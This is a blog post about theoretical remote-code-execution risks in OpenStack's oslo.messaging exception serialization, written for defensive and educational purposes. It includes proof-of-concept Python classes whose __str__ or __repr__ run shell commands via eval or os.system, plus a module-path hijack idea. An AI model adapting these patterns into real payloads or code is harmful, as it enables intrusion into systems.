<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned | Code Before Breach</title>
<meta name=keywords content="OpenStack,Nova,RCE,Vulnerability Analysis,oslo.messaging,Exception Serialization"><meta name=description content="Analysis of potential Remote Code Execution vulnerability in OpenStack Nova&rsquo;s exception serialization mechanism, including multiple PoC scenarios and defense recommendations."><meta name=author content><link rel=canonical href=https://windshock.github.io/en/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/><link href="https://fonts.googleapis.com/css2?family=Spectral:wght@400;700&display=swap" rel=stylesheet><link rel=alternate type=application/rss+xml title=RSS href=https://windshock.github.io/index.xml><link crossorigin=anonymous href=/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF+13Dyqob6ASlTrTye8=" rel="preload stylesheet" as=style><link rel=icon href=https://windshock.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://windshock.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://windshock.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://windshock.github.io/apple-touch-icon.png><link rel=mask-icon href=https://windshock.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://windshock.github.io/en/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/><link rel=alternate hreflang=ko href=https://windshock.github.io/ko/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css><script defer src=https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js></script><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-6N6EEJ259T"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6N6EEJ259T")}</script><meta property="og:url" content="https://windshock.github.io/en/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/"><meta property="og:site_name" content="Code Before Breach"><meta property="og:title" content="Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned"><meta property="og:description" content="Analysis of potential Remote Code Execution vulnerability in OpenStack Nova’s exception serialization mechanism, including multiple PoC scenarios and defense recommendations."><meta property="og:locale" content="en-US"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2025-06-10T00:00:00+00:00"><meta property="article:modified_time" content="2025-06-10T00:00:00+00:00"><meta property="article:tag" content="OpenStack"><meta property="article:tag" content="Nova"><meta property="article:tag" content="RCE"><meta property="article:tag" content="Vulnerability Analysis"><meta property="article:tag" content="Oslo.messaging"><meta property="article:tag" content="Exception Serialization"><meta name=twitter:card content="summary"><meta name=twitter:title content="Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned"><meta name=twitter:description content="Analysis of potential Remote Code Execution vulnerability in OpenStack Nova&rsquo;s exception serialization mechanism, including multiple PoC scenarios and defense recommendations."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://windshock.github.io/en/post/"},{"@type":"ListItem","position":2,"name":"Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned","item":"https://windshock.github.io/en/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned","name":"Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned","description":"Analysis of potential Remote Code Execution vulnerability in OpenStack Nova\u0026rsquo;s exception serialization mechanism, including multiple PoC scenarios and defense recommendations.","keywords":["OpenStack","Nova","RCE","Vulnerability Analysis","oslo.messaging","Exception Serialization"],"articleBody":"Author: Hyeongkwan Lee\nEmail: windshock@gmail.com\nGitHub: https://github.com/windshock\nLinkedIn: https://www.linkedin.com/in/windshock/\nBlog: https://windshock.github.io\nXML-RPC Security Series:\nSeries 1 - XML-RPC Security Vulnerabilities Analysis and Mitigation Strategies Series 2 - CVE-2019-17570: Apache XML-RPC Exploit Series 3 - Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned Overview This report analyzes theoretical Remote Code Execution (RCE) risks related to exception serialization and deserialization in OpenStack Nova’s use of the oslo.messaging library. The goal is not to claim that practical RCE is easily achievable, but to help security engineers and developers recognize anti-patterns and learn from them. Multiple real-world safeguards (such as module whitelisting, message broker isolation, and secure logging practices) make actual exploitation highly unlikely in production OpenStack environments. The following PoC scenarios are intended for educational purposes, to illustrate how insecure exception handling patterns could become risky if other defenses are misconfigured or absent.\nKey Findings Note: These PoCs are for educational demonstration of risky exception handling patterns. In real OpenStack deployments, multiple safeguards make actual exploitation highly unlikely.\n✅ PoC 1 – __str__ Override with eval(str(e)) (Theoretical Example) This proof-of-concept demonstrates, in a controlled example, that when an exception class overrides its __str__() method to return a malicious string, any call to eval(str(e)) could theoretically result in Remote Code Execution. In practice, such a pattern should never appear in production code, and OpenStack’s architecture includes multiple layers of defense.\nclass Evil(Exception): def __str__(self): return \"__import__('os').system('touch /tmp/from_str_eval')\" eval(str(Evil())) # Triggers RCE ✅ PoC 2 – __str__ Returns JSON Payload + eval (Theoretical Example) This variant shows, for educational purposes, how a __str__() method returning a JSON-encoded payload could, if mishandled, lead to code execution if the parsed content is used in an eval() call. Again, this is not a pattern seen in well-designed production systems, but highlights why input validation and secure exception handling are important.\nclass Evil(Exception): def __str__(self): return '{\"payload\": \"__import__(\\'os\\').system(\\'touch /tmp/json_rce\\')\"}' data = json.loads(str(Evil())) eval(data[\"payload\"]) # Triggers RCE ✅ PoC 3 – eval(repr(e)) (Theoretical Example) This PoC demonstrates, as a theoretical risk, that repr() can also be overridden to return arbitrary content. If any part of the system executes eval(repr(obj)) without ensuring that obj is a safe type, code execution could occur. This underscores that both __str__ and __repr__ must be considered attack surfaces in code reviews.\nclass Evil: def __repr__(self): return \"__import__('os').system('touch /tmp/hacked')\" eval(repr(Evil())) # RCE ✅ PoC 4 – Trigger via serialize_remote_exception() (Theoretical Example) Here, the PoC illustrates that if OpenStack’s serialize_remote_exception() function were to call str(e) on a malicious exception object, code execution could theoretically occur. In practice, OpenStack’s design and deployment mitigations make this scenario extremely unlikely.\nimport sys import os from oslo_messaging._drivers import common as exceptions class EvilError(Exception): def __str__(self): os.system(\"touch /tmp/hacked\") return \"rce via serialize\" try: raise EvilError(\"boom\") except Exception: exc_info = sys.exc_info() serialized = exceptions.serialize_remote_exception(exc_info) print(\"File created:\", os.path.exists(\"/tmp/hacked\")) → Malicious __str__() is executed within the serializer. ✅ PoC 5 – Race Condition with Threads (Theoretical Example) This experiment simulates a theoretical race condition scenario in which multiple threads concurrently deserialize and serialize exception objects. The test proves that when two threads (a producer and a consumer) access shared exceptions via a queue, the serializer thread may trigger str(ex) on a malicious object before it has been fully sanitized. As discussed below, this is not a realistic risk in actual OpenStack deployments.\nNote: In actual OpenStack oslo.messaging and Nova implementations, global variables or direct sharing of exception objects across threads or processes does not occur. Exception objects are always serialized and deserialized across process or network boundaries, meaning each thread or process works with its own instance. Therefore, the race condition demonstrated in this PoC does not represent a realistic risk in real-world OpenStack environments. This PoC should be considered a theoretical demonstration of Python concurrency issues, not a practical exploit vector for OpenStack.\nThis demonstrates the danger of using shared resources and exception objects across asynchronous or threaded boundaries without protective synchronization or trust boundaries. Even in environments with the GIL, race windows can expose critical bugs.\nLimitations of This PoC This PoC assumes shared mutable global state (hit_count), which is not typically used in production code.\nPython’s Global Interpreter Lock (GIL) limits true concurrency, so race conditions in CPython are often timing-dependent and may be less predictable.\nThe Boom object is explicitly crafted and passed across a shared queue without serialization boundaries; in real deployments, such objects would typically be serialized/deserialized across process or network boundaries, limiting direct reference reuse.\nNevertheless, this PoC illustrates the class of timing-sensitive bugs that arise from deserialization and stringification of attacker-influenced objects in multi-threaded environments.\nimport threading import os import time import random from queue import Queue import queue # for queue.Full exception # Shared resources hit_count = 0 ex_queue = Queue(maxsize=5) class Boom(Exception): def __str__(self): global hit_count local_count = hit_count print(f\"Thread {threading.current_thread().name} reading hit_count={local_count}\") time.sleep(random.uniform(0.001, 0.003)) # 1ms ~ 3ms delay hit_count = local_count + 1 print(f\"Thread {threading.current_thread().name} set hit_count={hit_count}\") os.system(f\"touch /tmp/hacked_race_{hit_count}_thread_{threading.current_thread().name}\") return f\"boom_{hit_count}\" def deserializer(): global hit_count while hit_count \u003c 5: ex = Boom() print(f\"Thread {threading.current_thread().name} created Boom\") try: ex_queue.put(ex, timeout=0.1) time.sleep(random.uniform(0.001, 0.003)) except queue.Full: time.sleep(random.uniform(0.001, 0.003)) continue def serializer(): global hit_count while hit_count \u003c 5: try: ex = ex_queue.get(timeout=0.3) print(f\"Thread {threading.current_thread().name} got Boom, calling str\") str(ex) # Triggers Boom.__str__ time.sleep(random.uniform(0.001, 0.003)) except Queue.Empty: time.sleep(random.uniform(0.001, 0.003)) continue # Minimal thread setup threads = [ threading.Thread(target=deserializer, name=f\"Deserializer-{i}\") for i in range(2) ] + [ threading.Thread(target=serializer, name=f\"Serializer-{i}\") for i in range(3) ] for t in threads: t.start() for t in threads: t.join(timeout=5) print(\"Final hit_count:\", hit_count) print(\"Generated files:\", sorted([f for f in os.listdir(\"/tmp\") if f.startswith(\"hacked_race_\")])) OpenStack-specific Vulnerability Context The vulnerable functions serialize_remote_exception() and deserialize_remote_exception() are part of the oslo.messaging library, not Nova itself. Nova uses them as part of its RPC communication and error-handling infrastructure. These functions are located in oslo_messaging/_drivers/common.py and are called by various RPC transport mechanisms. Because oslo.messaging is a shared library across OpenStack services, this vulnerability has implications beyond Nova if other components reuse the same serialization logic.\nserialize_remote_exception() This function serializes Python exceptions into a dictionary format for RPC transport. One critical line calls str(failure), which is the same as str(ex). If the exception object has an overridden __str__() method with side effects, this call can trigger arbitrary code execution. This makes the serialization process itself a potential RCE entry point, especially if exceptions are passed from untrusted sources or deserialized objects.\ndata = { 'class': cls_name, 'module': mod_name, 'message': str(failure), 'tb': tb, 'args': failure.args, 'kwargs': kwargs } deserialize_remote_exception() This function dynamically imports and reconstructs exception classes from RPC responses. It uses the module and class fields in the serialized data to locate the exception class and instantiate it with the provided arguments. While Nova restricts deserialization via allowed_remote_exmods, any misconfiguration or unsafe exception content (such as crafted __str__() methods) can still result in dangerous behavior if the reconstructed exception is logged or stringified later.\n_EXCEPTIONS_MODULE = 'builtins' _EXCEPTIONS_MODULES = ['exceptions', 'builtins'] if module in _EXCEPTIONS_MODULES: module = _EXCEPTIONS_MODULE if module != _EXCEPTIONS_MODULE and module not in allowed_remote_exmods: return RemoteError(name, message, traceback) mod = importutils.import_module(module) klass = getattr(mod, name) if not issubclass(klass, Exception): raise TypeError(...) exc = klass(*args, **kwargs) These functions expose str(e) as a potential RCE entry point if attacker-controlled classes are deserialized and logged.\nOpenStack Products and Custom Exception Namespaces In some OpenStack products such as Ironic, exceptions are not limited to the Python builtins but are often defined in product-specific namespaces. For example, Ironic and related components use their own exception modules, and the list of allowed exception namespaces may include values like:\nallowed_exception_namespaces = [ 'ironic_lib.exception.', 'ironic.common.exception.', 'ironic_inspector.utils.' ] See: Ironic JSON RPC Reference\nDue to Python’s import path resolution, if a local file exists that matches the expected module path (e.g., ironic/common/exception.py), that local file will be imported first. This means that if an attacker is able to upload or place a malicious exception file at the expected path, it could be loaded during deserialization. For example:\nfrom ironic.common import exception from oslo_messaging._drivers import common as exceptions e = '{\"class\": \"MyException\", \"module\": \"ironic.common.exception\", \"message\": \"\\uc5d0\\ub7ec: test\", \"tb\": [\"MyException: \\uc5d0\\ub7ec: test\\n\"], \"args\": [\"test\"], \"kwargs\": {}}' sys.modules['ironic.common.exception'] # ","wordCount":"1615","inLanguage":"en","datePublished":"2025-06-10T00:00:00Z","dateModified":"2025-06-10T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://windshock.github.io/en/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/"},"publisher":{"@type":"Organization","name":"Code Before Breach","logo":{"@type":"ImageObject","url":"https://windshock.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://windshock.github.io/en/ accesskey=h title="Code Before Breach (Alt + H)"><img src=https://windshock.github.io/images/logo-terminal-animated.svg alt aria-label=logo class="h-7 w-auto" height=28>Code Before Breach</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li><li><a href=https://windshock.github.io/ko/ title=한국어 aria-label=한국어>Ko</a></li></ul></div></div><ul id=menu><li><a href=https://windshock.github.io/en/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://windshock.github.io/en/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://windshock.github.io/en/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://windshock.github.io/en/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://windshock.github.io/en/about/ title=About><span>About</span></a></li><li><a href=https://windshock.github.io/en/index.xml title=RSS><span>RSS</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://windshock.github.io/en/>Home</a>&nbsp;»&nbsp;<a href=https://windshock.github.io/en/post/>Posts</a></div><h1 class="post-title entry-hint-parent">Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned</h1><div class=post-meta><span title='2025-06-10 00:00:00 +0000 UTC'>June 10, 2025</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1615 words&nbsp;|&nbsp;Translations:<ul class=i18n_list><li><a href=https://windshock.github.io/ko/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/>Ko</a></li></ul></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#overview aria-label=Overview>Overview</a></li><li><a href=#key-findings aria-label="Key Findings">Key Findings</a><ul><li><a href=#-poc-1- aria-label="✅ PoC 1 – __str__ Override with eval(str(e)) (Theoretical Example)">✅ PoC 1 – __str__ Override with eval(str(e)) (Theoretical Example)</a></li><li><a href=#-poc-2- aria-label="✅ PoC 2 – __str__ Returns JSON Payload + eval (Theoretical Example)">✅ PoC 2 – __str__ Returns JSON Payload + eval (Theoretical Example)</a></li><li><a href=#-poc-3- aria-label="✅ PoC 3 – eval(repr(e)) (Theoretical Example)">✅ PoC 3 – eval(repr(e)) (Theoretical Example)</a></li><li><a href=#-poc-4--trigger-via aria-label="✅ PoC 4 – Trigger via serialize_remote_exception() (Theoretical Example)">✅ PoC 4 – Trigger via serialize_remote_exception() (Theoretical Example)</a></li><li><a href=#-poc-5--race-condition-with-threads-theoretical-example aria-label="✅ PoC 5 – Race Condition with Threads (Theoretical Example)">✅ PoC 5 – Race Condition with Threads (Theoretical Example)</a><ul><li><a href=#limitations-of-this-poc aria-label="Limitations of This PoC">Limitations of This PoC</a></li></ul></li></ul></li><li><a href=#openstack-specific-vulnerability-context aria-label="OpenStack-specific Vulnerability Context">OpenStack-specific Vulnerability Context</a><ul><li><a href=#serialize_remote_exception aria-label=serialize_remote_exception()>serialize_remote_exception()</a></li><li><a href=#deserialize_remote_exception aria-label=deserialize_remote_exception()>deserialize_remote_exception()</a></li><li><a href=#openstack-products-and-custom-exception-namespaces aria-label="OpenStack Products and Custom Exception Namespaces">OpenStack Products and Custom Exception Namespaces</a></li></ul></li><li><a href=#challenges-to-exploitation aria-label="Challenges to Exploitation">Challenges to Exploitation</a></li><li><a href=#recommendations aria-label=Recommendations>Recommendations</a></li><li><a href=#related-references-and-resources aria-label="Related References and Resources">Related References and Resources</a></li><li><a href=#conclusion aria-label=Conclusion>Conclusion</a></li></ul></div></details></div><div class=post-content><p><strong>Author</strong>: Hyeongkwan Lee<br><strong>Email</strong>: <a href=mailto:windshock@gmail.com>windshock@gmail.com</a><br><strong>GitHub</strong>: <a href=https://github.com/windshock>https://github.com/windshock</a><br><strong>LinkedIn</strong>: <a href=https://www.linkedin.com/in/windshock/>https://www.linkedin.com/in/windshock/</a><br><strong>Blog</strong>: <a href=https://windshock.github.io/>https://windshock.github.io</a></p><hr><p><strong>XML-RPC Security Series:</strong></p><ul><li><a href=https://windshock.github.io/en/post/2025-03-28-xml-rpc-security-vulnerabilities-analysis-and-mitigation-strategies/>Series 1 - XML-RPC Security Vulnerabilities Analysis and Mitigation Strategies</a></li><li><a href=https://windshock.github.io/en/post/2025-04-24-cve-2019-17570-apache-xmlrpc/>Series 2 - CVE-2019-17570: Apache XML-RPC Exploit</a></li><li><a href=https://windshock.github.io/en/post/2025-05-30-rce-via-exception-serialization-in-openstack-nova/>Series 3 - Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned</a></li></ul><hr><h2 id=overview><strong>Overview</strong><a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>This report analyzes theoretical Remote Code Execution (RCE) risks related to exception serialization and deserialization in OpenStack Nova&rsquo;s use of the <code>oslo.messaging</code> library. The goal is not to claim that practical RCE is easily achievable, but to help security engineers and developers recognize anti-patterns and learn from them. Multiple real-world safeguards (such as module whitelisting, message broker isolation, and secure logging practices) make actual exploitation highly unlikely in production OpenStack environments. The following PoC scenarios are intended for educational purposes, to illustrate how insecure exception handling patterns could become risky if other defenses are misconfigured or absent.</p><hr><h2 id=key-findings><strong>Key Findings</strong><a hidden class=anchor aria-hidden=true href=#key-findings>#</a></h2><blockquote><p><strong>Note:</strong> These PoCs are for educational demonstration of risky exception handling patterns. In real OpenStack deployments, multiple safeguards make actual exploitation highly unlikely.</p></blockquote><h3 id=-poc-1-><strong>✅ PoC 1 – <code>__str__</code> Override with <code>eval(str(e))</code> (Theoretical Example)</strong><a hidden class=anchor aria-hidden=true href=#-poc-1->#</a></h3><p>This proof-of-concept demonstrates, in a controlled example, that when an exception class overrides its <code>__str__()</code> method to return a malicious string, any call to <code>eval(str(e))</code> could theoretically result in Remote Code Execution. In practice, such a pattern should never appear in production code, and OpenStack&rsquo;s architecture includes multiple layers of defense.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Evil</span>(<span style=color:#a6e22e>Exception</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __str__(self):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;__import__(&#39;os&#39;).system(&#39;touch /tmp/from_str_eval&#39;)&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>eval(str(Evil()))  <span style=color:#75715e># Triggers RCE</span>
</span></span></code></pre></div><h3 id=-poc-2-><strong>✅ PoC 2 – <code>__str__</code> Returns JSON Payload + <code>eval</code> (Theoretical Example)</strong><a hidden class=anchor aria-hidden=true href=#-poc-2->#</a></h3><p>This variant shows, for educational purposes, how a <code>__str__()</code> method returning a JSON-encoded payload could, if mishandled, lead to code execution if the parsed content is used in an <code>eval()</code> call. Again, this is not a pattern seen in well-designed production systems, but highlights why input validation and secure exception handling are important.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Evil</span>(<span style=color:#a6e22e>Exception</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __str__(self):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;{&#34;payload&#34;: &#34;__import__(</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>os</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>).system(</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>touch /tmp/json_rce</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>)&#34;}&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> json<span style=color:#f92672>.</span>loads(str(Evil()))
</span></span><span style=display:flex><span>eval(data[<span style=color:#e6db74>&#34;payload&#34;</span>])  <span style=color:#75715e># Triggers RCE</span>
</span></span></code></pre></div><h3 id=-poc-3-><strong>✅ PoC 3 – <code>eval(repr(e))</code> (Theoretical Example)</strong><a hidden class=anchor aria-hidden=true href=#-poc-3->#</a></h3><p>This PoC demonstrates, as a theoretical risk, that <code>repr()</code> can also be overridden to return arbitrary content. If any part of the system executes <code>eval(repr(obj))</code> without ensuring that <code>obj</code> is a safe type, code execution could occur. This underscores that both <code>__str__</code> and <code>__repr__</code> must be considered attack surfaces in code reviews.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Evil</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __repr__(self):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;__import__(&#39;os&#39;).system(&#39;touch /tmp/hacked&#39;)&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>eval(repr(Evil()))  <span style=color:#75715e># RCE</span>
</span></span></code></pre></div><h3 id=-poc-4--trigger-via><strong>✅ PoC 4 – Trigger via <code>serialize_remote_exception()</code> (Theoretical Example)</strong><a hidden class=anchor aria-hidden=true href=#-poc-4--trigger-via>#</a></h3><p>Here, the PoC illustrates that if OpenStack&rsquo;s <code>serialize_remote_exception()</code> function were to call <code>str(e)</code> on a malicious exception object, code execution could theoretically occur. In practice, OpenStack&rsquo;s design and deployment mitigations make this scenario extremely unlikely.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> oslo_messaging._drivers <span style=color:#f92672>import</span> common <span style=color:#66d9ef>as</span> exceptions
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>EvilError</span>(<span style=color:#a6e22e>Exception</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __str__(self):
</span></span><span style=display:flex><span>        os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;touch /tmp/hacked&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;rce via serialize&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>raise</span> EvilError(<span style=color:#e6db74>&#34;boom&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span>:
</span></span><span style=display:flex><span>    exc_info <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>exc_info()
</span></span><span style=display:flex><span>    serialized <span style=color:#f92672>=</span> exceptions<span style=color:#f92672>.</span>serialize_remote_exception(exc_info)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;File created:&#34;</span>, os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(<span style=color:#e6db74>&#34;/tmp/hacked&#34;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>→</span> Malicious __str__() <span style=color:#f92672>is</span> executed within the serializer<span style=color:#f92672>.</span>
</span></span></code></pre></div><h3 id=-poc-5--race-condition-with-threads-theoretical-example><strong>✅ PoC 5 – Race Condition with Threads (Theoretical Example)</strong><a hidden class=anchor aria-hidden=true href=#-poc-5--race-condition-with-threads-theoretical-example>#</a></h3><p>This experiment simulates a theoretical race condition scenario in which multiple threads concurrently deserialize and serialize exception objects. The test proves that when two threads (a producer and a consumer) access shared exceptions via a queue, the serializer thread may trigger <code>str(ex)</code> on a malicious object before it has been fully sanitized. As discussed below, this is not a realistic risk in actual OpenStack deployments.</p><blockquote><p><strong>Note:</strong> In actual OpenStack oslo.messaging and Nova implementations, global variables or direct sharing of exception objects across threads or processes does not occur. Exception objects are always serialized and deserialized across process or network boundaries, meaning each thread or process works with its own instance. Therefore, the race condition demonstrated in this PoC does not represent a realistic risk in real-world OpenStack environments. This PoC should be considered a theoretical demonstration of Python concurrency issues, not a practical exploit vector for OpenStack.</p></blockquote><p>This demonstrates the danger of using shared resources and exception objects across asynchronous or threaded boundaries without protective synchronization or trust boundaries. Even in environments with the GIL, race windows can expose critical bugs.</p><h4 id=limitations-of-this-poc><strong>Limitations of This PoC</strong><a hidden class=anchor aria-hidden=true href=#limitations-of-this-poc>#</a></h4><ul><li><p>This PoC assumes shared mutable global state (<code>hit_count</code>), which is not typically used in production code.</p></li><li><p>Python&rsquo;s Global Interpreter Lock (GIL) limits true concurrency, so race conditions in CPython are often timing-dependent and may be less predictable.</p></li><li><p>The <code>Boom</code> object is explicitly crafted and passed across a shared queue without serialization boundaries; in real deployments, such objects would typically be serialized/deserialized across process or network boundaries, limiting direct reference reuse.</p></li><li><p>Nevertheless, this PoC illustrates the class of timing-sensitive bugs that arise from deserialization and stringification of attacker-influenced objects in multi-threaded environments.</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> threading
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> random
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> queue <span style=color:#f92672>import</span> Queue
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> queue  <span style=color:#75715e># for queue.Full exception</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Shared resources</span>
</span></span><span style=display:flex><span>hit_count <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>ex_queue <span style=color:#f92672>=</span> Queue(maxsize<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Boom</span>(<span style=color:#a6e22e>Exception</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __str__(self):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>global</span> hit_count
</span></span><span style=display:flex><span>        local_count <span style=color:#f92672>=</span> hit_count
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Thread </span><span style=color:#e6db74>{</span>threading<span style=color:#f92672>.</span>current_thread()<span style=color:#f92672>.</span>name<span style=color:#e6db74>}</span><span style=color:#e6db74> reading hit_count=</span><span style=color:#e6db74>{</span>local_count<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
